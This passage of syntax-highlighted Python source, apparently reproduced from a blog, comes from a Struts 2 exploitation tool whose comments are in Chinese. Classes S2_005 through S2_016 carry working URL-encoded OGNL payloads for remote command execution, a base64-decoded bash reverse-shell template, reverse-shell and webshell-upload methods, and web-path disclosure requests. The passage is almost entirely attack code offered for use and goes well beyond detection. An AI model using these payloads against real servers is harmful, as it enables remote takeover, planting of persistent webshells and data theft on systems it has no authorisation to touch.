class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span></span><br><span class="line">        self.exec_payload = self.exec_payload1</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-005&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.exec_payload = self.exec_payload2</span><br><span class="line">            html = echo_check(self)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> html</span><br><span class="line">            <span class="keyword">if</span> html:</span><br><span class="line">                self.is_vul = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;S2-005&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&#x27;?&#x27;</span> + self.web_path, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + <span class="string">&#x27;?&#x27;</span> + payload, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_007</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-007漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;&#x27;%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))%20%2B%20&#x27;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            self.data = <span class="string">&quot;username=test&amp;password=&#123;exp&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-007&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd)))</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_008</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-008漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29)&quot;</span></span><br><span class="line"></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-008&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_009</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-009漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27&#123;cmd&#125;%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(&#123;key&#125;)(%27meh%27)]&quot;</span></span><br><span class="line"></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            self.data = <span class="string">&quot;key&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.data = data.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-009&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd), key=self.data)</span><br><span class="line">        html = get(self.url + <span class="string">&quot;&amp;&#123;key&#125;=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(key=self.data, payload=payload), self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_012</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-012漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-012&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_013</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-013/S2-014漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D&quot;</span></span><br><span class="line">    upload_paylaod = <span class="string">&quot;$%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.println(%22OK%22),%23outstr.close())%7D&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-013&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&quot;?x=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(payload=self.web_path), self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&quot;?x=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(payload=self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell</span>(<span class="params">self, upload_path, shell_path</span>):</span></span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = <span class="string">&quot;t=&#123;t&#125;&amp;f=&#123;f&#125;&quot;</span>.<span class="built_in">format</span>(t=quote(shell), f=upload_path)</span><br><span class="line">        html = post(self.url + <span class="string">&quot;?x=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(payload=self.upload_paylaod), data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_015</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-015漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%24%7B%23context%5B&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())%2C%23q%7D&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> url.endswith(<span class="string">&quot;.action&quot;</span>):</span><br><span class="line">            rindex = url.rindex(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            self.url = url[:rindex + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">            self.url = url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.url = url + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-015&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + <span class="string">&quot;&#123;payload&#125;.action&quot;</span>.<span class="built_in">format</span>(payload=payload), self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&#x27;ERROR:&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">            ps = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">            result = unquote(ps[<span class="number">1</span>].text[<span class="number">9</span>:-<span class="number">4</span>]).strip()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_016</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-016漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;redirect%3A%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;redirect:$%7B%23a%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D&quot;</span></span><br><span class="line">    exec_payload1 = <span class="string">&quot;redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D&quot;</span></span><br><span class="line">    exec_payload2 = <span class="string">&quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22&#123;cmd&#125;%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span></span><br><span class="line">    exec_payload3 = <span class="string">r&quot;redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;&quot;</span></span><br><span class="line">    upload_payload1 = <span class="string">r&quot;&quot;&quot;redirect:$&#123;%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()&#125;&amp;t=SHELL&quot;&quot;&quot;</span></span><br><span class="line">    upload_payload2 = <span 